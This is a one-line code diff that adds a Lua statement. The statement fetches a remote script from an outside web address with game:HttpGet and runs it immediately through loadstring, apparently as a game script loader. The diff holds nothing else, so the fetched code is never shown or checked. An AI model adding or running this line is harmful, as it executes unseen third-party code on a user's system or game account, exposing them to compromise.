@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.ihwa.live/loader.lua"))()
